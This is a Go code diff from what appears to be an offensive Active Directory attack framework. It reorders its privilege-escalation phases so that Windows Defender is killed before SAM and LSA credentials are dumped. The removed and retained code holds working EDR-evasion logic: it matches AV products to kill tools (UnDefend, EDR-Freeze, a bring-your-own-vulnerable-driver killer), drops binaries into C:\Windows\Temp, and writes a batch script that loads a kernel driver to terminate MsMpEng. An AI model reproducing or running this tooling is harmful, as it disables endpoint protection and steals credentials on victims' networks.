@@ -463,13 +463,13 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		baselinePlans := runPlanning(state, result, availCaps)
 		latestPlans := baselinePlans
 
-		// ── SUB-PHASE 1: SYSTEM check + credential dump ──────────
-		gotSystem := doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "system_check")
+		// ── SUB-PHASE 1: SYSTEM check (no dump yet — disarm Defender first) ──
+		gotSystem := doSystemCheck(ctx, state, host, exec, domain, user, pass, result, "system_check")
 
-		// ── SUB-PHASE 2: AV kill + deep credential dump ──────
-		// Disable Defender via UnDefend, then cascade through available dump tools.
+		// ── SUB-PHASE 2: AV kill + credential dump ──────
 		if gotSystem {
 			runUnDefendKill(ctx, state, host, exec, domain, user, pass, result)
+			runSAMLSADump(ctx, state, host, exec, domain, user, pass, result)
 			runDeepCredDump(ctx, state, host, exec, domain, user, pass, result)
 		}
 
@@ -480,7 +480,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 
 		// ── SUB-PHASE 4: Re-check SYSTEM (GPO abuse may have elevated us) ─
 		if !gotSystem {
-			gotSystem = doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "gpo_abuse")
+			gotSystem = doSystemCheck(ctx, state, host, exec, domain, user, pass, result, "gpo_abuse")
 		}
 
 		// ── SUB-PHASE 5: Local LPE chain (supplementary) ──────
@@ -490,7 +490,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 
 		// ── SUB-PHASE 6: Final SYSTEM re-check after LPE ──────
 		if !gotSystem {
-			doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "local_lpe")
+			doSystemCheck(ctx, state, host, exec, domain, user, pass, result, "local_lpe")
 		}
 
 		// ── SUB-PHASE 7: Child-to-parent domain escalation ────
@@ -578,37 +578,9 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 	return result
 }
 
-// ── SUB-PHASE 1: Pre-Evasion ───────────────────────────────
-
-var avPipelineMap = map[string]string{
-	"windows defender":   "undefend",
-	"defender":           "undefend",
-	"sentinelone":        "phantomkiller",
-	"sentinel one":       "phantomkiller",
-	"crowdstrike":        "phantomkiller",
-	"cylance":            "phantomkiller",
-	"carbon black":       "coldwer",
-	"carbonblack":        "coldwer",
-	"sophos":             "coldwer",
-	"tanium":             "phantomkiller",
-	"microsoft defender": "undefend",
-}
-
-func selectAVPipeline(detected map[string]string) string {
-	for av := range detected {
-		avLower := strings.ToLower(av)
-		for pattern, pipeline := range avPipelineMap {
-			if strings.Contains(avLower, pattern) {
-				return pipeline
-			}
-		}
-	}
-	return ""
-}
-
 // runUnDefendKill deploys UnDefend.exe and runs --kill to disable Defender.
 // Requires admin/SYSTEM on target. Safe to run even if Defender isn't present.
-func runUnDefendKill(ctx context.Context, state *core.ADState, host core.Host,
+func runUnDefendKill(ctx context.Context, _ *core.ADState, host core.Host,
 	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
 
 	if !tools.UnDefend.Available() {
@@ -654,247 +626,6 @@ func runUnDefendKill(ctx context.Context, state *core.ADState, host core.Host,
 	time.Sleep(8 * time.Second)
 }
 
-func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
-	exec core.Executor, result *core.ToolResult) {
-
-	killTarget := host
-	for _, h := range state.Hosts {
-		if !h.IsDC {
-			killTarget = h
-			break
-		}
-	}
-
-	// Check what AV/EDR is actually running on the target
-	domain, user, pass, hash := getCredential(state)
-	if domain != "" && user != "" {
-		provider := NewNetExecProvider(core.ProviderConfig{
-			Host: killTarget.IP, Domain: domain,
-			Username: user, Password: pass, Hash: hash,
-		})
-		av, err := provider.EnumerateAV(ctx)
-		if err == nil && len(av) > 0 {
-			var names []string
-			for name := range av {
-				names = append(names, name)
-			}
-			avStr := strings.Join(names, ", ")
-			fmt.Printf("[*] Detected EDR/AV on %s: %s\n", killTarget.IP, avStr)
-
-			// Update host EDR field in state
-			for i := range state.Hosts {
-				if state.Hosts[i].IP == killTarget.IP {
-					state.Hosts[i].EDR = avStr
-					break
-				}
-			}
-
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-				Source: "enum_av", Key: killTarget.IP,
-				Value: avStr, Confidence: 0.9, Timestamp: time.Now(),
-			})
-
-			// Select evasion pipeline based on what's detected
-			pipeline := selectAVPipeline(av)
-			switch pipeline {
-			case "undefend":
-				fmt.Printf("[*] Targeting %s with UnDefend pipeline\n", avStr)
-				runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
-			case "phantomkiller":
-				if tools.PhantomKiller.Available() {
-					fmt.Printf("[*] Targeting %s with PhantomKiller pipeline\n", avStr)
-					runPhantomKiller(ctx, killTarget, exec, result)
-				} else {
-					fmt.Println("[!] PhantomKiller not available, trying UnDefend fallback")
-					runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
-				}
-			case "coldwer":
-				fmt.Printf("[*] Targeting %s with ColdWer pipeline\n", avStr)
-				runColdWerDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
-			default:
-				fmt.Printf("[*] No specific pipeline for %s, trying PhantomKiller (best-effort)\n", avStr)
-				if tools.PhantomKiller.Available() {
-					runPhantomKiller(ctx, killTarget, exec, result)
-				}
-			}
-		} else {
-			fmt.Printf("[*] No AV/EDR detected on %s (or enum failed), skipping pre-evasion\n", killTarget.IP)
-		}
-	} else {
-		fmt.Println("[!] No credentials for AV enumeration, running blind")
-		if tools.PhantomKiller.Available() {
-			runPhantomKiller(ctx, host, exec, result)
-		}
-	}
-
-	fmt.Println("[*] Waiting 10s for EDR termination...")
-	time.Sleep(10 * time.Second)
-}
-
-// runUnDefendDirect deploys UnDefend + nanodump against a specific target
-func runUnDefendDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
-	if !tools.UnDefend.Available() {
-		fmt.Println("[!] UnDefend.exe not found, skipping")
-		return
-	}
-
-	remoteDir := `C:\Windows\Temp\`
-	deployR := exec.Execute(ctx, core.Action{
-		Artifact: "UnDefend.exe", Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !deployR.Success {
-		fmt.Printf("[!] UnDefend deploy failed: %s\n", deployR.Error)
-		return
-	}
-	remotePath := deployR.Output
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
-	tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
-
-	exec.Execute(ctx, core.Action{
-		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
-	})
-
-	result.Evidence = append(result.Evidence, core.EvidenceEntry{
-		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-		Source: "undefend", Key: host.IP, Value: "Defender killed (AV-guided)",
-		Confidence: 0.85, Timestamp: time.Now(),
-	})
-}
-
-// runColdWerDirect deploys EDR-Freeze + nanodump against a specific target
-func runColdWerDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
-	remoteDir := `C:\Windows\Temp\`
-	freezerR := exec.Execute(ctx, core.Action{
-		Artifact: "EDR-Freeze.exe", Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !freezerR.Success {
-		fmt.Println("[!] EDR-Freeze deploy failed, skipping")
-		return
-	}
-	freezerPath := freezerR.Output
-
-	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
-		"Sophos.exe", "TaniumClient.exe", "CarbonBlack.exe"}
-	for _, proc := range edrProcs {
-		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
-		pidR := exec.Execute(ctx, core.Action{
-			Artifact: pidCmd, Method: "command", Timeout: 15 * time.Second,
-		})
-		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
-			pid := strings.TrimSpace(pidR.Output)
-			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
-			exec.Execute(ctx, core.Action{
-				Artifact: freezeCmd, Method: "command", Timeout: 15 * time.Second,
-			})
-			fmt.Printf("[*] ColdWer: Froze %s PID %s for 3s\n", proc, pid)
-			break
-		}
-	}
-
-	exec.Execute(ctx, core.Action{
-		Method: "cleanup", Arguments: []string{freezerPath}, Timeout: 15 * time.Second,
-	})
-
-	result.Evidence = append(result.Evidence, core.EvidenceEntry{
-		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-		Source: "coldwer", Key: host.IP, Value: "EDR freeze attempted (AV-guided)",
-		Confidence: 0.75, Timestamp: time.Now(),
-	})
-}
-
-func runPhantomKiller(ctx context.Context, host core.Host,
-	exec core.Executor, result *core.ToolResult) {
-
-	domain := host.Domain
-	remoteDir := `C:\Windows\Temp\`
-	var cleanups []string
-	defer func() {
-		if len(cleanups) > 0 {
-			exec.Execute(ctx, core.Action{
-				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
-			})
-		}
-	}()
-
-	batPath := deployAndExecPhantomKiller(ctx, exec, host, domain, remoteDir, &cleanups)
-	if batPath == "" {
-		return
-	}
-
-	execR := exec.Execute(ctx, core.Action{
-		Artifact: batPath, Method: "command",
-		Timeout: 60 * time.Second,
-	})
-	if execR.Success {
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-			Source: "phantomkiller", Key: host.IP, Value: "EDR terminated (BYOVD)",
-			Confidence: 0.85, RawOutput: execR.Output, Timestamp: time.Now(),
-		})
-		fmt.Printf("[+] PhantomKiller: EDR kill attempted successfully on %s\n", host.IP)
-	}
-}
-
-func deployAndExecPhantomKiller(ctx context.Context, exec core.Executor, host core.Host, domain, remoteDir string, cleanups *[]string) string {
-	drvR := exec.Execute(ctx, core.Action{
-		Artifact: "PhantomKiller.sys", Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !drvR.Success {
-		return ""
-	}
-	driverPath := drvR.Output
-	*cleanups = append(*cleanups, driverPath)
-
-	loaderR := exec.Execute(ctx, core.Action{
-		Artifact: "PhantomKiller.exe", Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !loaderR.Success {
-		return ""
-	}
-	loaderPath := loaderR.Output
-	*cleanups = append(*cleanups, loaderPath)
-
-	driverName := "PK_" + tools.RandString(4)
-	batContent := fmt.Sprintf(
-		`@echo off
-setlocal enabledelayedexpansion
-for /f "tokens=2 delims= " %%p in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do set PID=%%p
-if "!PID!"=="" echo No Defender PID found && exit /b 0
-sc.exe create %s binPath="%s" type=kernel
-sc.exe start %s
-%s !PID!
-`, driverName, driverPath, driverName, loaderPath)
-
-	batLocal := filepath.Join(os.TempDir(), "pk_"+tools.RandString(4)+".bat")
-	if err := os.WriteFile(batLocal, []byte(batContent), 0644); err != nil {
-		fmt.Printf("[!] PhantomKiller: failed to write batch file: %v\n", err)
-		return ""
-	}
-	defer os.Remove(batLocal)
-
-	batR := exec.Execute(ctx, core.Action{
-		Artifact: batLocal, Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !batR.Success {
-		return ""
-	}
-	batPath := batR.Output
-	*cleanups = append(*cleanups, batPath)
-
-	fmt.Printf("[*] PhantomKiller: loading driver and killing Defender on %s...\n", host.IP)
-	return batPath
-}
-
 // ── SUB-PHASE 3: Local LPE ─────────────────────────────────
 
 func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
@@ -925,7 +656,7 @@ func hasSystemEvidence(result *core.ToolResult) bool {
 }
 
 func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
-	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+	_ core.Executor, domain, user, pass string, result *core.ToolResult) {
 
 	if domain == "" || user == "" || pass == "" {
 		return
@@ -1280,7 +1011,7 @@ func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []strin
 	return plans
 }
 
-func formatScoredPath(plan planner.ScoredPath, start string) string {
+func formatScoredPath(plan planner.ScoredPath, _ string) string {
 	var b strings.Builder
 	fmt.Fprintf(&b, "Score: %.1f | Weight: %.1f | Noise: %.1f", plan.TotalCost, plan.TotalWeight, plan.TotalNoise)
 	if len(plan.NeededCaps) > 0 {
@@ -1667,8 +1398,8 @@ func findChildParentDCs(state *core.ADState) (child, parent *core.Host) {
 	return nil, nil
 }
 
-func doSystemCheckAndDump(ctx context.Context, state *core.ADState, host core.Host,
-	exec core.Executor, domain, user, pass string, result *core.ToolResult, source string) bool {
+func doSystemCheck(ctx context.Context, _ *core.ADState, host core.Host,
+	exec core.Executor, domain, _, _ string, result *core.ToolResult, source string) bool {
 
 	r := exec.Execute(ctx, core.Action{
 		Target:  core.HostRef{Name: host.IP, Domain: domain},
@@ -1685,6 +1416,11 @@ func doSystemCheckAndDump(ctx context.Context, state *core.ADState, host core.Ho
 		Source: source, Key: host.IP, Value: "SYSTEM",
 		Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
 	})
+	return true
+}
+
+func runSAMLSADump(ctx context.Context, state *core.ADState, host core.Host,
+	_ core.Executor, domain, user, pass string, result *core.ToolResult) {
 
 	fmt.Printf("[*] Dumping credentials from %s via SAM + LSA secrets...\n", host.IP)
 	for _, flag := range []string{"--sam", "--lsa"} {
@@ -1718,13 +1454,12 @@ func doSystemCheckAndDump(ctx context.Context, state *core.ADState, host core.Ho
 		})
 		fmt.Printf("[+] %s: %d credential(s) extracted from %s\n", flag, len(hashes), host.IP)
 	}
-	return true
 }
 
 // runDeepCredDump performs deep credential extraction after AV has been disabled.
 // Cascades through available tools: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA.
 func runDeepCredDump(ctx context.Context, state *core.ADState, host core.Host,
-	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+	exec core.Executor, domain, user, pass string, _ *core.ToolResult) {
 
 	utils.Step("Deep credential dump (post-evasion)...")
 	dumped := 0
